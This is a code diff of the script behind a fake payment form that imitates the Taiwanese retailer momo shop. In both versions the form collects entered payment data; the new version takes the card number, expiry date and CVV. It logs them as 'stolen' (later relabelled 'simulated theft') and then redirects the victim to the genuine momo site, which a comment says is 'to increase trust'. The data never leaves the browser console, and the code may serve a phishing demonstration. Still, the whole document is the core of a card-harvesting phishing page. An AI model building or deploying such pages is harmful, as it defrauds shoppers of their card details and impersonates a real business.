@@ -1,17 +1,23 @@
-document.getElementById("payForm").addEventListener("submit", function(e) {
+document.getElementById("paymentForm").addEventListener("submit", function(e) {
     e.preventDefault();
-    const inputs = document.querySelectorAll("input");
-    const data = Array.from(inputs).map(input => input.value);
 
-    if (data.some(val => !val.trim())) {
-        document.getElementById("payError").textContent = "請填寫所有欄位。";
+    const cardNumber = document.getElementById("cardNumber").value.trim();
+    const expiry = document.getElementById("expiry").value.trim();
+    const cvv = document.getElementById("cvv").value.trim();
+    const errorText = document.getElementById("paymentError");
+
+    if (!cardNumber || !expiry || !cvv) {
+        errorText.textContent = "請完整填寫所有欄位。";
         return;
     }
 
-    console.log("偷到信用卡資料：", data);
+    // 模擬資料竊取
+    console.log("模擬竊取信用卡資訊：", cardNumber, expiry, cvv);
 
-    document.querySelector("button").textContent = "付款處理中...";
+    errorText.textContent = "";
+
+    // 模擬延遲導向 momo 真頁，增加信任感
     setTimeout(() => {
-        window.location.href = "https://www.momoshop.com.tw/";
-    }, 3000);
+        window.location.href = "https://www.momoshop.com.tw/main/Main.jsp";
+    }, 2500);
 });
